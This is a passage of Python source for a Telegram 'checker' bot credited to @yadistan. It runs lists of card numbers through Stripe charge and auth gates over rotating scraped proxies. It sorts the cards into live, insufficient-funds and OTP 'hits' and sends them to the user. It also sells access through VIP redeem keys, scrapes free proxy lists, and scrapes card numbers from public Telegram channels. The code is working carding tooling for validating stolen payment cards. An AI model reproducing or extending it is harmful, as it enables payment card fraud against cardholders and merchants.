                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲
━━━━━━━━━━━━━━━━━
✅ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        if live_cards or insuf_cards:
            all_hits = live_cards + insuf_cards
            hits_text = f"<b>⚡ #stripe_charge $1.00 — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stripe_auth_file')
def menu_callback_stripe_auth(call):
    def my_function():
        id=call.from_user.id
        gate='𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵'
        dd = 0
        live = 0
        insufficient = 0
        otp = 0
        live_cards = []
        insuf_cards = []
        otp_cards = []
        
        
        bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                'status': 'start'
            }
                for cc in lino:
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, 
                                            message_id=call.message.message_id, 
                                            text='🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅ 🤖 𝗕𝗢𝗧 𝗯𝘆 ➜ @yadistan')
                        return
                    
                    cc = cc.strip()
                    bin_num = cc[:6]
                    bin_info, bank, country, country_code = get_bin_info(bin_num)
                    
                    start_time = time.time()
                    proxy = get_proxy_dict(id)
                    last = stripe_auth(cc, proxy)
                    execution_time = time.time() - start_time
                    
                    # ✅ APPROVED - collect
                    if "Approved" in last and "Insufficient" not in last:
                        live += 1
                        live_cards.append(f"✅ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ APPROVED WITH INSUFFICIENT - collect
                    elif "Insufficient" in last:
                        insufficient += 1
                        insuf_cards.append(f"💰 <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ✅ OTP REQUIRED - collect
                    elif "Otp" in last:
                        otp += 1
                        otp_cards.append(f"⚠️ <code>{cc}</code> | {bank} | {country} {country_code}")
                    
                    # ❌ DECLINED
                    else:
                        dd += 1
                    
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    stop = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣 ]", callback_data='stop')
                    mes.add(stop)
                    
                    bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴... | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━━━━━
💳 𝗖𝗮𝗿𝗱: <code>{cc}</code>
📡 𝗦𝘁𝗮𝘁𝘂𝘀: {last[:30]}
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
⚠️ 𝗢𝗧𝗣: {otp}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=mes, parse_mode='HTML')                                    
                    
                    if stopuser.get(f'{id}', {}).get('status') == 'stop':
                        break
                        
                    time.sleep(10)
        except Exception as e:
            print(e)
        stopuser[f'{id}']['status'] = 'start'
        done_kb = types.InlineKeyboardMarkup()
        done_kb.add(types.InlineKeyboardButton("YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(chat_id=call.message.chat.id, 
                      message_id=call.message.message_id, 
                      text=f'''<b>✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 | 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━━━━━
✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {live}
💰 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁: {insufficient}
⚠️ 𝗢𝗧𝗣: {otp}
❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {dd}
👻 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {total}
━━━━━━━━━━━━━━━━━
[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>''', reply_markup=done_kb, parse_mode='HTML')
        all_hits = live_cards + insuf_cards + otp_cards
        if all_hits:
            hits_text = f"<b>🔐 #stripe_auth — 𝗛𝗶𝘁𝘀 [{len(all_hits)}]\n━━━━━━━━━━━━━━━━━\n"
            hits_text += "\n".join(all_hits)
            hits_text += f"\n━━━━━━━━━━━━━━━━━\n[⌤] 𝗕𝗼𝘁 𝗯𝘆 @yadistan</b>"
            bot.send_message(call.from_user.id, hits_text, parse_mode='HTML', reply_markup=done_kb)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
    def my_function():
        try:
            code = message.text.split(' ')[1].strip().upper()
            
            if is_code_used(code):
                bot.reply_to(message, '<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗱𝗲 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝘂𝘀𝗲𝗱</b>', parse_mode="HTML")
                return
            
            with open("data.json", 'r', encoding='utf-8') as file:
                json_data = json.load(file)
            
            if code not in json_data:
                bot.reply_to(message, '<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗱𝗲</b>', parse_mode="HTML")
                return
            
            timer = json_data[code]['time']
            typ = json_data[code]['plan']
            
            json_data[str(message.from_user.id)] = {
                "plan": typ,
                "timer": timer,
                "username": message.from_user.username or '',
                "first_name": message.from_user.first_name or '',
            }
            
            del json_data[code]
            with _DATA_LOCK:
                with open("data.json", 'w', encoding='utf-8') as file:
                    json.dump(json_data, file, indent=2)
            
            mark_code_as_used(code)
            
            msg = f'''<b>𓆩 𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𓆪 ✅
💎 𝗗𝗲𝘃 : 『@yadistan』
⏳ 𝗧𝗶𝗺𝗲 : {timer}  ✅
📝 𝗧𝘆𝗽𝗲 : {typ}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
            
        except IndexError:
            bot.reply_to(message, '<b>❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗰𝗼𝗱𝗲\nمثال: /redeem MINUX-XXXX-XXXX-XXXX</b>', parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, f'<b>❌ 𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}</b>', parse_mode="HTML")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== أمر إنشاء الأكواد المعدل ==================
@bot.message_handler(commands=["code"])
def create_code(message):
    def my_function():
        user_id = message.from_user.id
        
        if user_id != admin:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  🚫  ACCESS  DENIED       ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ ❌ Admin only command.\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
            return

        def _parse_duration(s):
            """Parse '1d','2h','30day','1week','1mo','1month','720' → hours (float)"""
            import re as _re
            s = s.strip().lower()
            m = _re.match(r'^(\d+(?:\.\d+)?)\s*(h|hr|hrs|hour|hours|d|day|days|w|week|weeks|mo|month|months)?$', s)
            if not m:
                return None
            val = float(m.group(1))
            unit = (m.group(2) or '').rstrip('s')  # normalise plural
            if unit in ('', 'h', 'hr', 'hour'):
                return val
            elif unit in ('d', 'day'):
                return val * 24
            elif unit in ('w', 'week'):
                return val * 168
            elif unit in ('mo', 'month'):
                return val * 720
            return None

        try:
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message,
                    "<b>╔══════════════════════════╗\n"
                    "║  🎟️  G E N  V I P  K E Y  ║\n"
                    "╚══════════════════════════╝\n"
                    "│\n"
                    "│ Usage: <code>/code &lt;duration&gt;</code>\n"
                    "│\n"
                    "│ Examples:\n"
                    "│  <code>/code 1h</code>    → 1 hour key\n"
                    "│  <code>/code 1d</code>    → 1 day key\n"
                    "│  <code>/code 7d</code>    → 1 week key\n"
                    "│  <code>/code 30day</code> → 30 day key\n"
                    "│  <code>/code 1month</code>→ 1 month key\n"
                    "│  <code>/code 24</code>    → 24 hours key\n"
                    "└──────────────────────────</b>",
                    parse_mode='HTML')
                return

            h = _parse_duration(parts[1])
            if h is None:
                bot.reply_to(message,
                    "<b>❌ Invalid duration.\n\n"
                    "Use: <code>1h</code> · <code>1d</code> · <code>7d</code> · <code>30day</code> · <code>1month</code> · <code>24</code></b>",
                    parse_mode='HTML')
                return

            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)

            characters = string.ascii_uppercase + string.digits
            part1 = ''.join(random.choices(characters, k=5))
            part2 = ''.join(random.choices(characters, k=5))
            pas = f"{part1}-{part2}"

            PKT = timezone(timedelta(hours=5))
            current_time = datetime.now(PKT)
            expiry_time = current_time + timedelta(hours=h)
            expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M")

            # human-readable duration
            if h < 24:
                dur_label = f"{int(h)}h"
            elif h < 168:
                dur_label = f"{int(h//24)}d"
            elif h < 720:
                dur_label = f"{int(h//168)}w"
            else:
                dur_label = f"{int(h//720)}mo"

            new_data = {pas: {"plan": "VIP", "time": expiry_str}}
            existing_data.update(new_data)

            with open("data.json", 'w', encoding='utf-8') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)

            msg = (
                f"<b>✨ ✦ ─── V I P   K E Y   G E N ─── ✦ ✨\n"
                f"╔══════════════════════════╗\n"
                f"║  🎟️  KEY GENERATED — VIP  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│ 🏆 Plan    : VIP\n"
                f"│ ⏳ Duration: {dur_label}  ({h:.0f} hours)\n"
                f"│ 📅 Expires : {expiry_str}\n"
                f"│\n"
                f"│ 🔑 Key:\n"
                f"│ <code>/redeem {pas}</code>\n"
                f"└──────────────────────────\n"
                f"  ⌤ <a href='{_BOT_LINK}'>{_BOT_LABEL}</a>  │  <a href='https://t.me/deep_sonic'>ѕonιc</a></b>"
            )
            bot.reply_to(message, msg, parse_mode="HTML")

        except ValueError:
            bot.reply_to(message,
                "<b>╔══════════════════════════╗\n"
                "║  ⚠️  INVALID INPUT         ║\n"
                "╚══════════════════════════╝\n"
                "│\n"
                "│ ❌ Hours must be a number.\n"
                "│ Example: <code>/code 24</code>\n"
                "└──────────────────────────</b>",
                parse_mode='HTML')
        except Exception as e:
            bot.reply_to(message,
                f"<b>❌ Error: {str(e)[:80]}</b>",
                parse_mode='HTML')
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Admin: Add/Remove VIP ==================

def _resolve_user_id(raw):
    """Resolve a raw string (user_id or @username) to an integer user_id.
    Priority: numeric ID → DB lookup → Telegram API get_chat().
    Returns (user_id: int, display: str) or (None, error_msg: str)."""
    raw = raw.strip()

    # ── Numeric ID ────────────────────────────────────────────────
    if raw.lstrip('-').isdigit():
        return int(raw), raw

    # ── Username ──────────────────────────────────────────────────
    uname = raw.lstrip('@')

    # 1. DB lookup (fast — only works if user already used the bot)
    uid = db.get_user_id_by_username(uname)
    if uid:
        return uid, f"@{uname} (ID: {uid})"

    # 2. Telegram API fallback — works for any public username
    try:
        chat = bot.get_chat(f"@{uname}")
        if chat and chat.id:
            # Persist for future lookups
            db.save_user(chat.id,
                         username=chat.username,
                         first_name=getattr(chat, 'first_name', None))
            return chat.id, f"@{uname} (ID: {chat.id})"
    except Exception:
        pass

    return None, (
        f"❌ @{uname} nahi mila.\n\n"
        "Possible reasons:\n"
        "• Username galat hai\n"
        "• Username private hai ya exist nahi karta\n"
        "• User ID use karo: /addvip 123456789 [days]"
    )


@bot.message_handler(commands=["addvip"])
def addvip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage:\n"
            "<code>/addvip &lt;user_id | @username&gt; [days]</code>\n\n"
            "• days default = 30\n"
            "• Example: <code>/addvip 123456789 7</code>\n"
            "• Example: <code>/addvip @yadistan 30</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    days = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 30

    expiry = datetime.now() + timedelta(days=days)
    expiry_str = expiry.strftime("%Y-%m-%d %H:%M")

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}
        if str(target_id) not in data:
            data[str(target_id)] = {}
        data[str(target_id)]['plan']  = '𝗩𝗜𝗣'
        data[str(target_id)]['timer'] = expiry_str
        with open("data.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

    # ── Save to database ──────────────────────────────────────────
    uname_db = parts[1] if parts[1].startswith('@') else None
    try:
        chat_info = bot.get_chat(target_id)
        uname_db  = chat_info.username or uname_db
        fname_db  = chat_info.first_name or ''
    except Exception:
        fname_db  = ''
    db.save_vip_grant(target_id, username=uname_db, first_name=fname_db,
                      days=days, expiry=expiry_str)
    db.save_user(target_id, username=uname_db, first_name=fname_db, plan='VIP')

    bot.reply_to(message,
        f"<b>✅ VIP Added!\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 User ID: <code>{target_id}</code>\n"
        f"⏳ Duration: {days} days\n"
        f"📅 Expires: {expiry_str}</b>",
        parse_mode='HTML')

    try:
        bot.send_message(target_id,
            f"<b>🎉 Congratulations!\n"
            f"━━━━━━━━━━━━━━━\n"
            f"✅ Aapko VIP access de di gayi hai!\n"
            f"📅 Expires: {expiry_str}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>",
            parse_mode='HTML')
    except Exception:
        pass


@bot.message_handler(commands=["removevip"])
def removevip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage:\n"
            "<code>/removevip &lt;user_id | @username&gt;</code>\n\n"
            "• Example: <code>/removevip 123456789</code>\n"
            "• Example: <code>/removevip @yadistan</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}
        if str(target_id) not in data:
            bot.reply_to(message,
                f"<b>⚠️ User <code>{target_id}</code> data.json mein nahi mila.\n"
                f"(Shayad unhone bot use nahi kiya.)</b>",
                parse_mode='HTML')
            return
        old_plan = data[str(target_id)].get('plan', '𝗙𝗥𝗘𝗘')
        data[str(target_id)]['plan']  = '𝗙𝗥𝗘𝗘'
        data[str(target_id)]['timer'] = 'none'
        with open("data.json", 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

    db.remove_vip_grant(target_id)
    db.save_user(target_id, plan='FREE')

    bot.reply_to(message,
        f"<b>✅ VIP Removed!\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 User ID: <code>{target_id}</code>\n"
        f"📊 Was: {old_plan} → Now: FREE</b>",
        parse_mode='HTML')

    try:
        bot.send_message(target_id,
            "<b>⚠️ Notice\n"
            "━━━━━━━━━━━━━━━\n"
            "Aapki VIP access remove kar di gayi hai.\n"
            "━━━━━━━━━━━━━━━\n"
            "[⌤] Bot by @yadistan</b>",
            parse_mode='HTML')
    except Exception:
        pass


@bot.message_handler(commands=["checkvip"])
def checkvip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage: <code>/checkvip &lt;user_id | @username&gt;</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}

    user_data = data.get(str(target_id), {})
    plan  = user_data.get('plan', '𝗙𝗥𝗘𝗘')
    timer = user_data.get('timer', 'none')

    bot.reply_to(message,
        f"<b>🔍 User Info\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 ID: <code>{target_id}</code>\n"
        f"📊 Plan: {plan}\n"
        f"⏳ Expires: {timer}</b>",
        parse_mode='HTML')


@bot.message_handler(commands=["viplist"])
def viplist_command(message):
    """Admin only — list all active VIP users from database + data.json."""
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    now = datetime.now()

    # ── Primary source: database vip_grants table ─────────────────
    db_vips = db.get_vip_users()  # (user_id, username, first_name, days, added_at, expiry)

    # ── Fallback: data.json — catch users not yet in DB ───────────
    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                json_data = json.load(f)
        except Exception:
            json_data = {}

    db_ids = {row[0] for row in db_vips}

    json_vips      = []
    json_redeem_ids = set()  # track redeem-source users for labelling
    for uid_str, udata in json_data.items():
        plan_val = udata.get('plan', '')
        if plan_val in ('𝗩𝗜𝗣', 'VIP'):
            try:
                uid = int(uid_str)
            except ValueError:
                continue  # skip key-shaped entries like "XXXXX-XXXXX"
            if uid not in db_ids:
                expiry  = udata.get('timer') or udata.get('time') or 'N/A'
                uname_j = udata.get('username') or None
                fname_j = udata.get('first_name') or None
                json_vips.append((uid, uname_j, fname_j, '?', None, expiry))
                if plan_val == 'VIP':
                    json_redeem_ids.add(uid)

    all_vips = list(db_vips) + json_vips
    total    = len(all_vips)

    if total == 0:
        bot.reply_to(message,
            "<b>📋 VIP List\n━━━━━━━━━━━━━━━\n"
            "⚠️ Koi bhi VIP user nahi hai abhi.</b>",
            parse_mode='HTML')
        return

    # ── Build message (paginate at 30 per chunk) ──────────────────
    lines = []
    expired_count = 0
    for idx, row in enumerate(all_vips, 1):
        uid, uname, fname, days, added_at, expiry = row

        name_str  = fname or ''
        uname_str = f"@{uname}" if uname else ''
        display   = name_str or uname_str or f"ID:{uid}"

        # Expiry check
        expired_tag = ''
        if expiry and expiry != 'N/A':
            try:
                exp_dt = datetime.strptime(expiry.split('.')[0], "%Y-%m-%d %H:%M")
                if exp_dt < now:
                    expired_tag = '  ⚠️ Expired'
                    expired_count += 1
                else:
                    remain = (exp_dt - now).days
                    expired_tag = f'  ({remain}d left)'
            except Exception:
                pass

        source_tag = '  🎟️' if uid in json_redeem_ids else ''
        line = (
            f"<b>{idx}.</b> <code>{uid}</code>"
            + (f"  {uname_str}" if uname_str else '')
            + (f"  <i>{name_str}</i>" if name_str else '')
            + source_tag
            + f"\n    📅 Exp: <code>{expiry or 'N/A'}</code>{expired_tag}"
        )
        lines.append(line)

    redeem_count = len(json_redeem_ids)
    header = (
        f"<b>👑 VIP List  ·  {total} users"
        + (f"  ·  🎟️ {redeem_count} redeem" if redeem_count else '')
        + (f"  ·  {expired_count} expired" if expired_count else '')
        + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━\n<i>[⌤] @yadistan</i>"

    chunk_size = 30
    chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]

    for idx, chunk in enumerate(chunks):
        part_tag = f"  ·  Part {idx+1}/{len(chunks)}" if len(chunks) > 1 else ''
        msg = header.replace("</b>", f"{part_tag}</b>", 1) + "\n".join(chunk) + footer
        if idx == 0:
            bot.reply_to(message, msg, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, msg, parse_mode='HTML')


# ================== Admin Broadcast — .send ==================

@bot.message_handler(func=lambda m: (
    m.text and (
        m.text.lower().startswith('.send') or
        m.text.lower().startswith('/send')
    )
))
def send_broadcast_command(message):
    """Admin-only: broadcast any message (text or forwarded reply) to all active VIP users."""
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    # ── Collect all active VIP user IDs ──────────────────────────────
    now = datetime.now()
    vip_ids = set()

    # Primary: database
    try:
        db_vips = db.get_vip_users()
        for row in db_vips:
            uid, uname, fname, days, added_at, expiry = row
            if expiry and expiry != 'N/A':
                try:
                    exp_dt = datetime.strptime(str(expiry).split('.')[0], "%Y-%m-%d %H:%M")
                    if exp_dt < now:
                        continue  # expired
                except Exception:
                    pass
            vip_ids.add(int(uid))
    except Exception:
        pass

    # Fallback: data.json
    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                jd = json.load(f)
        except Exception:
            jd = {}
    for uid_str, udata in jd.items():
        plan_val = udata.get('plan', '')
        if plan_val in ('𝗩𝗜𝗣', 'VIP'):
            try:
                uid = int(uid_str)
            except ValueError:
                continue
            # check expiry
            expiry = udata.get('timer') or udata.get('time') or ''
            if expiry and expiry not in ('none', 'N/A', ''):
                try:
                    exp_dt = datetime.strptime(str(expiry).split('.')[0], "%Y-%m-%d %H:%M")
                    if exp_dt < now:
                        continue
                except Exception:
                    pass
            vip_ids.add(uid)

    if not vip_ids:
        bot.reply_to(message,
            "<b>⚠️ Koi active VIP user nahi mila. Broadcast cancel.</b>",
            parse_mode='HTML')
        return

    # ── Determine what to send ────────────────────────────────────────
    # Case 1: admin replied to a message → forward that replied message
    # Case 2: text after .send / /send → send as plain text
    replied = message.reply_to_message

    # Strip the command prefix to get custom text
    raw = message.text.strip()
    if raw.lower().startswith('.send'):
        custom_text = raw[5:].strip()
    elif raw.lower().startswith('/send'):
        custom_text = raw[5:].strip()
    else:
        custom_text = ''

    if not replied and not custom_text:
        bot.reply_to(message,
            "<b>📌 Usage:\n\n"
            "▸ Text broadcast:\n"
            "<code>.send Hello VIP members! 🎉</code>\n\n"
            "▸ Forward any message (photo/video/sticker/etc):\n"
            "Reply to any message → <code>.send</code></b>",
            parse_mode='HTML')
        return

    total = len(vip_ids)

    # ── Send progress message ─────────────────────────────────────────
    prog_msg = bot.reply_to(message,
        f"<b>📡 Broadcast shuru ho raha hai...\n"
        f"👥 Total VIP users: {total}</b>",
        parse_mode='HTML')

    sent = 0
    failed = 0

    for uid in vip_ids:
        try:
            if replied:
                # Forward the replied message (any content type)
                bot.forward_message(uid, replied.chat.id, replied.message_id)
            else:
                bot.send_message(uid, custom_text)
            sent += 1
        except Exception:
            failed += 1
        time.sleep(0.05)  # Telegram rate-limit safety

    # ── Final report ──────────────────────────────────────────────────
    try:
        bot.edit_message_text(
            f"<b>✅ Broadcast mukammal!\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"👥 Total VIPs  : {total}\n"
            f"✅ Sent        : {sent}\n"
            f"❌ Failed      : {failed}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"{'📸 Type: Forwarded message' if replied else '✉️ Type: Custom text'}</b>",
            chat_id=message.chat.id,
            message_id=prog_msg.message_id,
            parse_mode='HTML')
    except Exception:
        pass


# ================== Proxy Scraper — /scr ==================

PROXY_SOURCES = [
    ("ProxyScrape HTTP",  "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all&limit=100"),
    ("ProxyScrape SOCKS5","https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=5000&country=all&limit=100"),
    ("Geonode HTTP",      "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&protocols=http"),
    ("OpenProxy HTTP",    "https://openproxylist.xyz/http.txt"),
    ("OpenProxy SOCKS5",  "https://openproxylist.xyz/socks5.txt"),
    ("TheSpeedX HTTP",    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"),
    ("ShiftyTR HTTP",     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"),
]

def scrape_proxies_from_source(name, url):
    try:
        r = requests.get(url, timeout=12)
        if not r.ok:
            return []
        if 'geonode' in url:
            data = r.json().get('data', [])
            return [f"{p['ip']}:{p['port']}" for p in data]
        lines = r.text.strip().splitlines()
        return [l.strip() for l in lines if ':' in l.strip()]
    except:
        return []

def scrape_all_proxies():
    all_proxies = []
    seen = set()
    for name, url in PROXY_SOURCES:
        proxies = scrape_proxies_from_source(name, url)
        for p in proxies:
            if p not in seen:
                seen.add(p)
                all_proxies.append(p)
    return all_proxies

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  .scr <link> <quantity>  —  Telegram Channel Scraper
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _tg_scr_handler(message):
    """Handle .scr — paginated CC scraper from a public Telegram channel."""
    def _worker():
        uid = message.from_user.id
        args = message.text.split()

        if len(args) < 2 or not is_tg_link(args[1]):
            bot.reply_to(message, _scr_usage(), parse_mode='HTML',
                         disable_web_page_preview=True)
            return

        link    = args[1]
        raw_qty = args[2] if len(args) >= 3 else "20"

        # ── Validate ─────────────────────────────────────────────────────
        username, link_err = validate_link(link)
        if link_err:
            bot.reply_to(message, _scr_err(link_err), parse_mode='HTML',
                         disable_web_page_preview=True)
            return

        qty, qty_err = validate_quantity(raw_qty)
        if qty_err:
            bot.reply_to(message, _scr_err(qty_err), parse_mode='HTML',
                         disable_web_page_preview=True)
            return

        # ── Rate limit ───────────────────────────────────────────────────
        allowed, wait = _tg_scr_rate_check(uid)
        if not allowed:
            bot.reply_to(message,
                _scr_err(f"Too many requests — wait {wait}s"),
                parse_mode='HTML', disable_web_page_preview=True)
            return

        # ── Processing placeholder ───────────────────────────────────────
        wait_msg = bot.reply_to(message, _scr_proc(username),
                                parse_mode='HTML',
                                disable_web_page_preview=True)

        # ── Paginated CC scrape ──────────────────────────────────────────
        t0 = time.time()
        result = _tg_scrape_ccs(username, qty)
        elapsed = time.time() - t0

        err           = result.get("error")
        cards         = result.get("cards", [])
        msgs_scanned  = result.get("msgs_scanned", 0)
        pages         = result.get("pages_fetched", 0)
        cached        = result.get("cached", False)
        dupes_removed = result.get("dupes_removed", 0)

        if err and not cards:
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=wait_msg.message_id,
                                      text=_scr_err(err),
                                      parse_mode='HTML',
                                      disable_web_page_preview=True)
            except Exception:
                bot.reply_to(message, _scr_err(err), parse_mode='HTML',
                             disable_web_page_preview=True)
            return

        if not cards:
            result_text = _scr_no_cards(username, msgs_scanned, pages, elapsed)
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=wait_msg.message_id,
                                      text=result_text,
                                      parse_mode='HTML',
                                      disable_web_page_preview=True)
            except Exception:
                bot.reply_to(message, result_text, parse_mode='HTML',
                             disable_web_page_preview=True)
            return

        # ── Send .txt file only — STREAD SCRAPPER BOT style ────────────
        from io import BytesIO
        import random as _rnd
        file_content = "\n".join(cards)
        _rand_id  = _rnd.randint(10000, 99999)
